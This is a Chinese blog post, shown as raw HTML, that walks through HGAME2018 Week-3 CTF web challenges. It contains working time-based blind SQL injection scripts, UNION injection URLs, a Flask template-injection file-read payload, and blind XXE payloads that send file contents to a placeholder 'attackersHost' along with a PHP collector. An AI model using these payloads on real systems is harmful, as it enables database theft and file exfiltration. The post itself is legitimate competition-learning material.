@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>HGAME2018 Week-3 Web Writeup | Klaus&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="正常的SQLi打开以后说什么都没有…我猜是源码泄露，直接加上.bak就爆出源码了…">
+<meta name="keywords" content="CTF_Web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HGAME2018 Week-3 Web Writeup">
+<meta property="og:url" content="http://yoursite.com/2018/03/03/HGAME2018-Week-3-Web-Writeup/index.html">
+<meta property="og:site_name" content="Klaus&#39;s Blog">
+<meta property="og:description" content="正常的SQLi打开以后说什么都没有…我猜是源码泄露，直接加上.bak就爆出源码了…">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.loli.net/2018/03/03/5a9a9fe584f9d.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/03/03/5a9a9fe59401e.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/03/03/5a9a9fe5b650f.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/03/03/5a9a9fe5be804.jpg">
+<meta property="og:updated_time" content="2018-07-25T09:10:24.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="HGAME2018 Week-3 Web Writeup">
+<meta name="twitter:description" content="正常的SQLi打开以后说什么都没有…我猜是源码泄露，直接加上.bak就爆出源码了…">
+<meta name="twitter:image" content="https://i.loli.net/2018/03/03/5a9a9fe584f9d.jpg">
+  
+    <link rel="alternate" href="/atom.xml" title="Klaus&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Klaus&#39;s Blog</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">MIA SAN MIA</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-HGAME2018-Week-3-Web-Writeup" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/03/03/HGAME2018-Week-3-Web-Writeup/" class="article-date">
+  <time datetime="2018-03-03T02:28:11.000Z" itemprop="datePublished">2018-03-03</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      HGAME2018 Week-3 Web Writeup
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+	  <!-- Table of Contents -->
+		
+		  <div id="toc" class="toc-article">
+			<strong class="toc-title">文章目录</strong>
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#正常的SQLi"><span class="toc-number">1.</span> <span class="toc-text">正常的SQLi</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#简单的SQLi"><span class="toc-number">2.</span> <span class="toc-text">简单的SQLi</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#送分的SQLi"><span class="toc-number">3.</span> <span class="toc-text">送分的SQLi</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ngc’s-blog"><span class="toc-number">4.</span> <span class="toc-text">ngc’s blog</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#书店"><span class="toc-number">5.</span> <span class="toc-text">**书店</span></a></li></ol>
+		  </div>
+		
+        <h2 id="正常的SQLi"><a href="#正常的SQLi" class="headerlink" title="正常的SQLi"></a>正常的SQLi</h2><p>打开以后说什么都没有…我猜是源码泄露，直接加上.bak就爆出源码了…</p>
+<a id="more"></a>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">'name'</span>]);</span><br><span class="line"></span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">"select * from user where username = '&#123;<span class="variable">$username</span>&#125;'"</span>;</span><br><span class="line"><span class="variable">$re</span> = mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$rs</span> = mysqli_fetch_array(<span class="variable">$re</span>);</span><br><span class="line"></span><br><span class="line">// <span class="built_in">echo</span> <span class="variable">$rs</span>[<span class="string">'flag'</span>];</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$username</span> . <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"因为出题人太懒了，所以现在没有任何功能"</span>;</span><br><span class="line"></span><br><span class="line">.....</span><br></pre></td></tr></table></figure>
+<p>看起来觉得像是cookie注入，还需要进行base64加密，重新进入index.php抓包进行分析，先进性一次url解码然后再base64解码后发现是guest。<br>所以这里切换为admin，然后base64加密，YWRtaW4=，等号用%3d进行绕过测试，界面变成了hello admin，so…应该就是cookie注入,所以写脚本注入。<br>首先判断数据库的长度：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import urllib</span><br><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"><span class="comment">#test the length of database.</span></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">	<span class="attribute">url</span>=<span class="string">"http://123.206.203.108:10010/normalSQLi/index.php"</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(1,30):</span><br><span class="line">		<span class="attribute">r</span>=requests.session()</span><br><span class="line">		<span class="attribute">payload</span>=<span class="string">"admin' or if(length(database())="</span>+str(i)+",1,sleep(3))#"</span><br><span class="line">		cookie=&#123;<span class="string">"name"</span>:urllib.quote(base64.b64encode(payload))&#125;</span><br><span class="line">		<span class="attribute">start_time</span>=time.time()</span><br><span class="line">		r.post(<span class="attribute">url</span>=url,cookies=cookie)</span><br><span class="line">		<span class="keyword">if</span> time.time()-start_time&lt;2:</span><br><span class="line">			<span class="builtin-name">print</span> <span class="string">"The length of database is "</span>,i</span><br><span class="line">			break</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="attribute">__name__</span>=="__main__":</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure></p>
+<p>数据库长度为4，然后就是一系列的查找什么的…<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>willardtm.github.io<span class="regexp">/2018/</span><span class="number">02</span><span class="regexp">/19/</span>sqlilabs-Less-<span class="number">5</span>~<span class="number">6</span><span class="regexp">/</span></span><br></pre></td></tr></table></figure></p>
+<p>但是我觉得这样做一道题感觉有些麻烦，我在想能不能减少一些步骤来提高效率，so我找到了一份大师傅的WP，对比一下我发现大师傅和我做的不一样的是大师傅没有直接跑出对应表/列的长度，而是定义了一个比较大的数字直接运行。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">import urllib</span><br><span class="line">url = <span class="string">"http://123.206.203.108:10010/normalSQLi/index.php"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,1000):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(33,127):</span><br><span class="line">        #payload = <span class="string">"admin' or if((ascii(substr((),%s,1))=%s),sleep(3),false)#"</span>%(i,j)  user</span><br><span class="line">        #payload = <span class="string">"admin' or if((ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%s),sleep(3),false)#"</span>%(i,j) user</span><br><span class="line">        #payload = <span class="string">"admin' or if((ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='user'),%s,1))=%s),sleep(3),false)#"</span>%(i,j)</span><br><span class="line">        payload = <span class="string">"admin' or if((ascii(substr((select flag from user limit 2,1),%s,1))=%s),sleep(3),false)#"</span>%(i,j)</span><br><span class="line">        cookie = &#123;</span><br><span class="line">            <span class="string">"name"</span>:urllib.quote(base64.b64encode(payload))</span><br><span class="line">        &#125;</span><br><span class="line">        try:</span><br><span class="line">            r = requests.<span class="builtin-name">get</span>(<span class="attribute">url</span>=url,cookies=cookie,timeout=2.5)</span><br><span class="line">        except:</span><br><span class="line">            flag +=chr(j)</span><br><span class="line">            <span class="builtin-name">print</span> flag</span><br><span class="line">            break</span><br></pre></td></tr></table></figure></p>
+<p>大师傅博客链接：<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://skysec.top/<span class="number">2018</span>/<span class="number">02</span>/<span class="number">21</span>/week<span class="number">3</span>-hgame<span class="symbol">%E4</span><span class="symbol">%B9</span><span class="symbol">%8</span>Bweb<span class="symbol">%E7</span><span class="symbol">%B2</span><span class="symbol">%97</span><span class="symbol">%E7</span><span class="symbol">%95</span><span class="symbol">%A5</span><span class="symbol">%E8</span><span class="symbol">%AE</span><span class="symbol">%B0</span><span class="symbol">%E5</span><span class="symbol">%BD</span><span class="symbol">%95</span>/#week<span class="number">3</span>-<span class="symbol">%E4</span><span class="symbol">%B9</span><span class="symbol">%A6</span><span class="symbol">%E5</span><span class="symbol">%BA</span><span class="symbol">%97</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="简单的SQLi"><a href="#简单的SQLi" class="headerlink" title="简单的SQLi"></a>简单的SQLi</h2><p>这道不太会…（拿出小本本记好），等一等wp。</p>
+<h2 id="送分的SQLi"><a href="#送分的SQLi" class="headerlink" title="送分的SQLi"></a>送分的SQLi</h2><p>id=1这里是注入点，然后常规注入就行。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.25.18.223:10068/?id=-1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
+<p>爆出表：f111aa4g,users<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.25.18.223:10068/?id=-1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="number">0x6631313161613467</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
+<p>爆出列：id,dajiangyoude,f111aaaggg_w3<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/118.25.18.223:10068/</span>?id=-<span class="number">1</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,<span class="title">f111aaaggg_w3</span> <span class="title">from</span> <span class="title">f111aa4g</span>%23</span></span><br></pre></td></tr></table></figure></p>
+<p>这样就能拿到flag。<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;Th3_e4sist_sql_injeCti0n##&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="ngc’s-blog"><a href="#ngc’s-blog" class="headerlink" title="ngc’s blog"></a>ngc’s blog</h2><p>这是一道基于Python的模板注入…可以直接google搜索Flask漏洞…下面就是一大堆…所以对当前URL进行测试。<br><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//111.230.105.104:5000/</span>&#123;&#123;<span class="string">'abcd'</span>&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2018/03/03/5a9a9fe584f9d.jpg" alt><br><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//111.230.105.104:5000/</span>&#123;&#123;<span class="string">'abcd'</span>.upper()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>然后发现abcd这四个字母变成了大写字母…通过这里发现能够进行代码执行…<br><img src="https://i.loli.net/2018/03/03/5a9a9fe59401e.jpg" alt><br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.230.105.104:5000/&#123;&#123;''.<span class="strong">__class__</span>.<span class="strong">__base__</span>.<span class="strong">__subclasses__</span>()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>发现这里返回出了两个东西，but好像没什么用…<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://111.230.105.104:5000/&#123;&#123;''.__class__.__mro__</span>[<span class="string">2</span>]._<span class="emphasis">_subclasses_</span><span class="emphasis">_()&#125;&#125;</span></span><br></pre></td></tr></table></figure></p>
+<p>通过这样的方法就能看到所有类<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.230.105.104:5000/&#123;&#123;''.<span class="strong">__class__</span>.<span class="strong">__mro__</span>[<span class="string">2</span>].<span class="strong">__subclasses__</span>()[<span class="string">40</span>](<span class="link">'flag'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2018/03/03/5a9a9fe5b650f.jpg" alt><br>提示说flag在flag里面，所以读取…OK拿到flag…<br><img src="https://i.loli.net/2018/03/03/5a9a9fe5be804.jpg" alt><br>参考资料：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>drops.xmd5.com<span class="regexp">/static/</span>drops<span class="regexp">/tips-13683.html</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="书店"><a href="#书店" class="headerlink" title="**书店"></a>**书店</h2><p>题目上已经给出来了<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">     不喜欢我推荐的？那就把你喜欢的传上来看看啊</span></span><br><span class="line"><span class="comment">     &lt;input name="a" type="text"&gt;</span></span><br><span class="line"><span class="comment">     我只收经过base64的xml格式的书哦</span></span><br><span class="line"><span class="comment">     --&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>所以这很明显是一个xml注入攻击，根据题目提示flag在/a/b下面，所以这是一个外部实体注入的xml,先构建xml攻击语句。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY w <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///a/b"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;w;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>base64加密以后post数据…然而…什么回显都没有，想想这题250分，应该没这么简单，那就是Blind XXE了。<br>所以重新构造…<br><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span>[</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">data</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///a/b"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://attackersHost/xxe.xml"</span>&gt;</span></span></span><br><span class="line"><span class="perl">%remote;</span></span><br><span class="line"><span class="perl">%all;</span></span><br><span class="line"><span class="xml">]&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">all</span> <span class="meta-string">"&lt;!ENTITY send SYSTEM 'http://attackersHost/xxe.php?data=%data;'&gt;"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>])) &#123;</span></span><br><span class="line"><span class="php">    file_put_contents(<span class="string">'data'</span>, $_GET[<span class="string">'data'</span>]);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>参考资料：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>blog.csdn.net<span class="regexp">/u011721501/</span>article<span class="regexp">/details/</span><span class="number">43775691</span></span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/03/03/HGAME2018-Week-3-Web-Writeup/" data-id="cktfedox7000nf4ukn30rzihs" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF-Web/">CTF_Web</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/03/05/浅谈凸包算法/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          浅谈凸包算法
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/02/27/HGAME2018-Week-2-Writeup/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">HGAME2018 Week-2 Web Writeup</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    <div class="widget-wrap">
+    <h3 class="widget-title">联系方式</h3>
+    <div class="widget">
+	  <li><a>klausvon@163.com</a></li>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">目录</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Algorithm/">Algorithm</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/HTML/">HTML</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/NLP/">NLP</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/NLP-知识图谱/">NLP,知识图谱</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Python/">Python</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/VQA/">VQA</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/XSS漏洞学习/">XSS漏洞学习</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/">代码审计</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/开发/">开发</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/数学学习/">数学学习</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞学习/">漏洞学习</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/环境配置/">环境配置</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/神经网络/">神经网络</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Algorithm/">Algorithm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C/">C++</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF-Web/">CTF_Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTML/">HTML</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/JavaScript/">JavaScript</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ML/">ML</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Model-Compression/">Model Compression</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/NLP/">NLP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL-injection/">SQL_injection</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/VQA/">VQA</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XXE/">XXE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/凸包算法/">凸包算法</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/大数据/">大数据</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/开发/">开发</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/数学学习/">数学学习</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/数据挖掘/">数据挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/环境配置/">环境配置</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/知识图谱/">知识图谱</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/神经网络/">神经网络</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/Algorithm/" style="font-size: 14.29px;">Algorithm</a> <a href="/tags/C/" style="font-size: 10px;">C++</a> <a href="/tags/CTF-Web/" style="font-size: 18.57px;">CTF_Web</a> <a href="/tags/HTML/" style="font-size: 10px;">HTML</a> <a href="/tags/JavaScript/" style="font-size: 10px;">JavaScript</a> <a href="/tags/ML/" style="font-size: 11.43px;">ML</a> <a href="/tags/Model-Compression/" style="font-size: 10px;">Model Compression</a> <a href="/tags/NLP/" style="font-size: 20px;">NLP</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/Python/" style="font-size: 11.43px;">Python</a> <a href="/tags/SQL-injection/" style="font-size: 12.86px;">SQL_injection</a> <a href="/tags/VQA/" style="font-size: 10px;">VQA</a> <a href="/tags/XXE/" style="font-size: 10px;">XXE</a> <a href="/tags/凸包算法/" style="font-size: 10px;">凸包算法</a> <a href="/tags/大数据/" style="font-size: 10px;">大数据</a> <a href="/tags/开发/" style="font-size: 18.57px;">开发</a> <a href="/tags/数学学习/" style="font-size: 11.43px;">数学学习</a> <a href="/tags/数据挖掘/" style="font-size: 11.43px;">数据挖掘</a> <a href="/tags/环境配置/" style="font-size: 10px;">环境配置</a> <a href="/tags/知识图谱/" style="font-size: 17.14px;">知识图谱</a> <a href="/tags/神经网络/" style="font-size: 15.71px;">神经网络</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/07/31/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2021/06/03/Basic-Understanding-of-Optimization/">Basic Understanding of Optimization</a>
+          </li>
+        
+          <li>
+            <a href="/2021/06/02/Why-Deep-Structure/">Why Deep Structure</a>
+          </li>
+        
+          <li>
+            <a href="/2021/05/23/Model-Compression-基本概念/">What is Model Compression</a>
+          </li>
+        
+          <li>
+            <a href="/2020/05/21/CSS在开发中的基本操作小结/">CSS在开发中的基本操作小结</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+    <div class="widget-wrap">
+    <h3 class="widget-title">友情链接</h3>
+    <div class="widget">
+	 <a class="theme-link"  href="https://mteacher.top/"> martini's blog </a><span>&nbsp;&nbsp;</span>
+    </div>
+  </div>
+
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2021 Klaus<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
